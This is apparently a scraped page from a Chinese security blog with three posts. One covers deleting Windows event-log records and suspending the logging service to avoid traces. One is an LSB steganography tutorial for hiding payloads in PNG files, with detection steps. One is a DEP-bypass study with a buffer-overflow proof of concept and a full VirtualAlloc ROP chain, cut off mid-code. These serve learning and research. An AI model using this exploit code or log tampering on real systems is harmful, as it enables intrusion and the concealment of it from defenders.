<p>我的<a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp">代码</a>中采用的方法虽然能解决这个问题，但是需要考虑很多细节和意外情况，程序实现上比较复杂</p>

<p>所以，我在我的工程中也加入了利用EvtExportLog删除日志的方法，地址如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordbyTerminateProcessEx.cpp</p>

<p>代码实现了自动获得日志服务的进程，结束进程，释放句柄，利用EvtExportLog修改指定的系统日志文件内容，修改成功后重新启动日志服务</p>

<p>程序测试如图：</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-2.png" alt="Alt text"></p>

<h2 id="0x07-其他细节">0x07 其他细节</h2>
<hr>

<p>某些情况下，关闭Eventlog进程和重启服务Eventlog会产生日志文件，位于system.evtx下，EventID为<code class="language-plaintext highlighter-rouge">7034</code>和<code class="language-plaintext highlighter-rouge">7036</code></p>

<p>为了避免产生日志7034和7036，可通过关闭日志服务Eventlog线程的方法关闭日志记录功能</p>

<p>关闭日志服务Eventlog线程的powershell实现代码：</p>

<p>https://github.com/hlldz/Invoke-Phant0m</p>

<p>关闭日志服务Eventlog线程的c实现代码：</p>

<p>https://github.com/3gstudent/Windwos-EventLog-Bypass</p>

<p>介绍细节的分析文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/">《利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过》</a></p>

<p>在实际应用中，通常是先线程挂起，最后再恢复线程</p>

<p>参考地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/SuspendorResumeTid.cpp</p>

<p>代码支持挂起、恢复和结束日志服务的线程，可用来关闭和恢复日志记录功能</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了通过关闭服务对应的进程，释放文件句柄，解除文件占用，删除当前系统单条日志记录的方法。</p>

<p>优化关闭日志记录功能的代码，添加挂起和恢复的代码，支持关闭和重新开启系统的日志功能</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 18, 2018
  </div>

  
</article><article class="post">
  <h1>隐写技巧——PNG文件中的LSB隐写</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<p>上篇对PNG的文件格式进行了分析，介绍了如何在不影响PNG文件的正常浏览下将payload以辅助数据块tEXt的格式插入到PNG文件中。这次将要介绍一个在图像数据块IDAT下隐藏payload的技巧——LSB隐写</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/0.png" alt="Alt text"></p>

<blockquote>
  <p>图片引用自http://datagenetics.com/blog/march12012/index.html</p>
</blockquote>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<h3 id="idat数据块">IDAT数据块</h3>

<ul>
  <li>储存图像像数数据</li>
  <li>在数据流中可包含多个连续顺序的图像数据块</li>
  <li>采用LZ77算法的派生算法进行压缩</li>
  <li>可以用zlib解压缩</li>
</ul>

<p>zlib解压缩的python实现代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#! /usr/bin/env python
import zlib
import binascii
IDAT = "789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667".decode('hex')
result = binascii.hexlify(zlib.decompress(IDAT))
print result
</code></pre></div></div>

<blockquote>
  <p>引用自http://drops.wooyun.org/tips/4862</p>
</blockquote>

<h3 id="lsb隐写">LSB隐写</h3>
<ul>
  <li>LSB全称least significant bit，最低有效位</li>
  <li>PNG文件中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216 种颜色</li>
  <li>人类的眼睛可以区分约1000万种不同的颜色</li>
  <li>这意味着人类的眼睛无法区分余下的颜色大约有6777216种</li>
  <li>LSB隐写就是修改RGB颜色分量的最低二进制位（LSB），而人类的眼睛不会注意到这前后的变化</li>
  <li>每个像数可以携带3比特的信息</li>
</ul>

<h2 id="0x02-python实现">0x02 Python实现</h2>
<hr>
<p>关于LSB隐写在github上值得学习的项目：</p>

<p>https://github.com/RobinDavid/LSB-Steganography</p>

<p>https://github.com/cyberinc/cloacked-pixel</p>

<p>下面对cloacked-pixel进行测试</p>

<p>测试图片：</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/big.png" alt="Alt text"></p>

<p><strong>源文件下载地址:</strong>
http://www.easyicon.net/language.en/1119182-Enderman_Png_icon.html</p>

<h3 id="1-加密">1、 加密</h3>

<p>运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python lsb.py hide big.png 1.txt 123456
</code></pre></div></div>

<p><strong>参数说明：</strong></p>

<p>hide：表示加密模式
big.png：待加密的png图片
1.txt：存放payload
123456：加密的密码</p>

<p>运行后生成图片<code class="language-plaintext highlighter-rouge">big.png-stego.png</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-1.PNG" alt="Alt text"></p>

<p>分析一下加密图片big.png-stego.png的格式，使用上篇文章介绍的<code class="language-plaintext highlighter-rouge">check.cpp</code></p>

<p><strong>下载地址:</strong></p>

<p>https://github.com/3gstudent/PNG-Steganography/blob/master/check.cpp</p>

<p>加密前后对比如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-3.PNG" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">cloacked-pixel</code>在加密的过程中会删除其他数据块，只保留关键数据块IDAT</p>

<p>使用<code class="language-plaintext highlighter-rouge">HexEditorNeo</code>查看加密图片也能印证我们的判断，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-4.PNG" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>当然也可以通过阅读源码进行分析</p>

<h3 id="2-解密">2、 解密</h3>

<p>运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python lsb.py extract big.png-stego.png 3.txt 123456
</code></pre></div></div>

<p><strong>参数说明：</strong>
extract：表示解密模式 
big.png-stego.png：待解密的png图片
3.txt：存放导出的payload
123456：解密密码</p>

<p>如图，成功解密获得payload</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-2.PNG" alt="Alt text"></p>

<h3 id="3-分析">3、 分析</h3>

<p>运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python lsb.py analyse big.png-stego.png 
</code></pre></div></div>

<p><strong>参数说明：</strong></p>

<p>analyse：表示分析模式
big.png-stego.png ：待分析的png图片
运行后会对图像进行分析，将其分割成块，标记每个块的最低有效位</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-5.PNG" alt="Alt text"></p>

<p>这是加密前后分析对比图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-6.png" alt="Alt text"></p>

<p>肉眼几乎无法分辨图片的差别，因为payload越短，分析图的差别就越小，这里我们可以借助软件帮助分析</p>

<p><strong>工具名称：</strong><code class="language-plaintext highlighter-rouge">Stegsolve</code></p>

<p><strong>下载地址：</strong></p>

<p>http://www.caesum.com/handbook/Stegsolve.jar</p>

<p><strong>环境搭建：</strong></p>

<p>安装jdk，配置java环境</p>

<p>使用<code class="language-plaintext highlighter-rouge">Stegsolve</code>打开a.png,选择Analyse-Image Combiner，选择b.png</p>

<p>进行<code class="language-plaintext highlighter-rouge">异或对比(XOR)</code>,如图，检测到细微的差异</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-7.png" alt="Alt text"></p>

<h2 id="0x03-c实现">0x03 C++实现</h2>
<hr>
<p><code class="language-plaintext highlighter-rouge">Grant Curell</code>分享了通过c++实现的方法，值得学习，所以在此对其介绍并进行测试</p>

<p><strong>文章地址：</strong>
http://www.codeproject.com/Articles/581298/PNG-Image-Steganography-with-libpng
<strong>作者：</strong></p>

<p>Grant Curell</p>

<p><strong>代码下载链接：</strong></p>

<p>http://www.codeproject.com/KB/security/581298/PNG_stego.zip</p>

<p><strong>测试环境：</strong></p>

<p>Win7 X64</p>

<p>vs2012</p>

<h3 id="1-直接编译会报错">1、 直接编译会报错</h3>

<p>项目<code class="language-plaintext highlighter-rouge">zlib</code>可直接编译成功</p>

<p>编译项目<code class="language-plaintext highlighter-rouge">libpng</code>，错误如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fatal error C1083: Cannot open include file: 'zlib.h': No such file or directory
</code></pre></div></div>

<p><strong>解决方法：</strong></p>

<p>需要对项目添加include目录</p>

<p>右键-Property-VC++ Directories</p>

<p>选择Include Directories</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-8.png" alt="Alt text"></p>

<p>添加zlib-1.2.3，输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..\..\..\zlib-1.2.3;
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-9.png" alt="Alt text"></p>

<p>再次编译，报错如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fatal error LNK1181: cannot open input file 'zlib.lib'
</code></pre></div></div>

<p><strong>解决方法：</strong></p>

<p>需要对项目添加lib目录</p>

<p>选择Library Directories</p>

<p>添加zlib.lib，输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..\..\..\LIB Debug;
</code></pre></div></div>

<p>如图，编译成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-10.png" alt="Alt text"></p>

<p><strong>Tips：</strong></p>

<p>在Include Directories和Library Directories中也可以直接指定绝对路径(如C:\test\cloacked-pixel-master\PNG_stego\zlib-1.2.3)，本例使用<code class="language-plaintext highlighter-rouge">..\</code>表示的是相对路径</p>

<p>编译项目<code class="language-plaintext highlighter-rouge">PNG_encode_decode</code>，发生同样的编译错误</p>

<p><strong>解决方法：</strong></p>

<p>Include Directories下添加zlib-1.2.3和libpng-1.2.37-src，输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../zlib-1.2.3;../libpng-1.2.37-src;
</code></pre></div></div>

<p>Library Directories下添加libpng.lib，输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..\LIB Debug;
</code></pre></div></div>

<p>如图，最终编译成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-11.PNG" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>三个项目工程存在前后的调用关系，所以编译顺序为<code class="language-plaintext highlighter-rouge">zlib</code>-<code class="language-plaintext highlighter-rouge">libpng</code>-<code class="language-plaintext highlighter-rouge">PNG_encode_decode</code></p>

<h3 id="2-加密测试">2、 加密测试</h3>
<p>待加密文件：big.png</p>

<p>payload文件：1.txt</p>

<p>输出加密文件：bigen.png</p>

<p>项目<code class="language-plaintext highlighter-rouge">PNG_encode_decode</code>中的main.cpp修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "PNG_file.h"
void main() {

	PNG_file link = PNG_file("big.png");
	link.encode("1.txt");
	link.outputPNG("bigen.png");
}
</code></pre></div></div>

<p>运行后生成<code class="language-plaintext highlighter-rouge">bigen.png</code>，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/bigen.png" alt="Alt text"></p>

<p>对比加密前后的文件，大小存在差异，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-12.png" alt="Alt text"></p>

<p>原理上LSB隐写不会改变文件大小，查找原因</p>

<p>使用<code class="language-plaintext highlighter-rouge">check.cpp</code>解析数据块目录，发现加密后多了数个tTXt段</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-13.png" alt="Alt text"></p>

<p>使用HexEditorNeo查看加密图片细节，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-14.png" alt="Alt text"></p>

<p>加密后的图片包含了原图片的一些信息，造成了图片大小不同</p>

<h3 id="3-去掉多余信息">3、 去掉多余信息</h3>

<p><strong>方法a:</strong></p>

<p>使用<code class="language-plaintext highlighter-rouge">HexEditorNeo</code>直接删除多余信息</p>

<p><strong>方法b：</strong></p>

<p>使用<code class="language-plaintext highlighter-rouge">compress.cpp</code></p>

<p><strong>下载地址：</strong></p>

<p>https://github.com/3gstudent/PNG-Steganography/blob/master/compress.cpp</p>

<p>生成去掉多余tTXt段的加密图片<code class="language-plaintext highlighter-rouge">bigensimple.png</code>，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/bigensimple.png" alt="Alt text"></p>

<p>bigensimple.png同原图片大小相同，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-15.png" alt="Alt text"></p>

<h3 id="4-解密测试">4、 解密测试</h3>

<p>项目<code class="language-plaintext highlighter-rouge">PNG_encode_decode</code>中的main.cpp修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "PNG_file.h"
void main() {

	PNG_file link = PNG_file("bigensimple.png");
	link.decode("2.txt");
}
</code></pre></div></div>

<p>运行后生成2.txt，获得存储加密后的payload</p>

<h3 id="5-分析">(5) 分析</h3>

<p>对于LSB隐写，可使用<code class="language-plaintext highlighter-rouge">Stegsolve</code>辅助分析</p>

<p>打开加密图片后，选择Analyse-DataExtract</p>

<p>Bit Planes 选中Reg、Green、Blue的第0位</p>

<p>Bit Order选中LSB First</p>

<p>Bit Plane Order选中RGB</p>

<p>可以看到加密形式的payload，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-22/2-16.png" alt="Alt text"></p>

<p><strong>注：</strong>
当然可以通过阅读程序源码找到图片的加密数据，本例只是给出对图片分析的一些参考思路</p>

<h2 id="0x04-小结">0x04 小结</h2>

<hr>
<p>本文分别介绍如何通过Python和C++实现对PNG文件的LSB隐写，参照文中的分析思路也可对常见的LSB隐写数据进行提取分析。</p>

<p><strong>注：</strong></p>

<p>修改好的PNG_stego工程已上传至github：</p>

<p>https://github.com/3gstudent/PNG_stego-test</p>

<p><strong>更多学习资料：</strong></p>

<p>https://github.com/fgrimme/Matroschka</p>

<p>https://waronpants.net/article/png-steganography/</p>

<p>https://waronpants.net/pngsteg/trunk/steg.c</p>

<p>http://www1.chapman.edu/~nabav100/ImgStegano/</p>

<p>http://www.libpng.org/pub/png/libpng-1.2.5-manual.html#section-3.1</p>

<p>https://www.w3.org/TR/PNG/</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on July 22, 2016
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>接着介绍DEP绕过的另一种方法——利用VirtualAlloc绕过DEP。通过VirtualAlloc函数可以申请一段具有可执行属性的内存，相比于VirtualProtect，传入VirtualAlloc的四个参数不需要先读取再赋值，可在shellcode中直接指定，结构更简单。当然，利用Immunity Debugger的mona插件可自动构造利用VirtualAlloc绕过DEP的ROP链。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>
    <p>调用VirtualAlloc函数时的Bug及修复</p>
  </li>
  <li>
    <p>选择合适的替代指令，修改mona自动生成的rop链，实现利用</p>
  </li>
  <li>
    <p>利用VirtualAlloc绕过DEP时需要考虑的细节，如对shellcode的长度要求</p>
  </li>
</ul>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<p><strong>VirtualAlloc:</strong></p>

<p>LPVOID WINAPI VirtualAlloc(
LPVOID  lpAddress,
SIZE_T  dwSize,
DWORD flAllocationType,
DWORD flProtect
)</p>

<p>lpAddress:申请内存区域的地址
dwSize:申请内存区域的大小
flAllocationType:申请内存的类型
flProtect:申请内存的访问控制类型</p>

<p>申请成功时函数返回申请内存的起始地址，申请失败时返回NULL</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<p><strong>测试环境：</strong></p>

<ul>
  <li>测试系统： Win 7</li>
  <li>编译器：  VS2012</li>
  <li>build版本：  Release</li>
</ul>

<p><strong>项目属性：</strong></p>

<ul>
  <li>关闭GS</li>
  <li>关闭优化</li>
  <li>关闭SEH</li>
  <li>打开DEP</li>
  <li>关闭ASLR</li>
  <li>禁用c++异常</li>
  <li>禁用内部函数</li>
</ul>

<p><strong>注：</strong></p>

<p>详细配置方法在上篇文章有说明</p>

<p>同样是测试memcpy的缓冲器溢出，测试POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x41414141,  
      0x41414141
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  return 0;
}
</code></pre></div></div>

<p>编译成exe，使用Immunity Debugger打开</p>

<p>使用mona插件自动生成rop链，输入：</p>

<p><code class="language-plaintext highlighter-rouge">!mona rop -m *.dll -cp nonull</code></p>

<p>查看rop_chains.txt，会列出可用来关闭DEP的ROP链</p>

<p>选择VirtualAlloc函数，详情如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &amp;VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------

ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------
*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );
</code></pre></div></div>

<h3 id="测试1">测试1：</h3>

<p>填入上述ROP链，接着加上测试的命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUSH 1;
POP ECX;
</code></pre></div></div>

<p>对应机器码为0x9059016A</p>

<p>组合后的POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  char Buf[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  return 0;
}
</code></pre></div></div>

<p>使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-1.png" alt="Alt text"></p>

<p>如图，查看传入的函数参数</p>

<p>申请内存区域的起始地址为0x0012FF38
申请内存区域的大小为0x0000D101,换算成十进制为53505
申请内存的类型为0x00001000
申请内存的访问控制类型为0x00000040，即PAGE_EXECUTE_READWRITE</p>

<p>按F8单步跟踪，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-2.png" alt="Alt text"></p>

<p>返回值EAX为0,表示生成失败</p>

<p>查找原因，根据之前的经验，猜测是申请内存区域过长导致</p>

<h3 id="测试2">测试2：</h3>

<p>尝试修改内存大小</p>

<p>申请内存区域的起始地址为0x0012FF38，距离当前内存页结束还有200字节(0x00130000-0x0012FF38)</p>

<p>猜测修改的内存长度小于等于200才能满足条件</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-3.png" alt="Alt text"></p>

<p>如上图，将内存长度设置为200(0x000000C8)</p>

<p>按F8单步跟踪，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-4.png" alt="Alt text"></p>

<p>申请成功，函数返回申请内存的起始地址</p>

<p>特别注意的是此处为当前内存页的起始地址：0x0012F000（而不是传入的内存起始地址0x0012FF38）</p>

<h3 id="测试3">测试3：</h3>

<p>再次测试，将长度设置为201，分配内存失败</p>

<p>根据以上测试结果，猜测：VirtualAllocEx()函数无法跨内存页申请内存</p>

<h3 id="测试4">测试4：</h3>

<p>继续测试， 将长度设置为1，函数返回当前内存页的起始地址：0x0012F000，并且shellcode成功执行</p>

<p>说明传入的函数长度对分配内存没有影响，但是加上申请内存的起始地址后必须小于当前内存页的长度</p>

<p>也就是说，在溢出过程中，通过VirtualAllocEx()函数申请的内存大小为固定值</p>

<p>现在，我们通过手动修改栈地址实现了DEP的绕过，下面将寻找合适的替换指令，构建自己的ROP链，解决mona自动生成产生的BUG</p>

<p>PUSHAD表示将所有寄存器的值入栈，入栈顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</p>

<p>跟踪到PUSHAD，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-5.png" alt="Alt text"></p>

<p>EBX存储内存的长度，需要将EBX修改为小于201的值</p>

<h2 id="0x04-查找替代指令构造rop链">0x04 查找替代指令，构造ROP链</h2>
<hr>

<p>在rop.txt中寻找合适的替代指令</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-6.png" alt="Alt text"></p>

<p>如上图，搜索关键词EBX,找到一条合适的替代指令：</p>

<p><code class="language-plaintext highlighter-rouge">0x771c80a2 :  # XOR EAX,EAX # POP EBX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}</code></p>

<p><code class="language-plaintext highlighter-rouge">XOR EAX,EAX</code> 会将寄存器EAX的值清零
<code class="language-plaintext highlighter-rouge">POP EBX</code> 会从栈顶取值并赋值给EBX</p>

<p>选择合适的位置，并为EBX赋值,需要注意：</p>

<p>该指令将寄存器EAX的值清零，所以需要找到与EAX寄存器值无关的位置</p>

<p>POP EBX会读取下一条指令的内容，并赋值给EBX，所以后面接上EBX的值就好，例如0x00000028, // Set EBX=0x00000028(40)</p>

<p>找到一个合适的位置，放在<code class="language-plaintext highlighter-rouge"> 0x693a7031,  // POP EAX // RETN [MSVCR110.dll]</code> 前面</p>

<p>完整shellcode如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
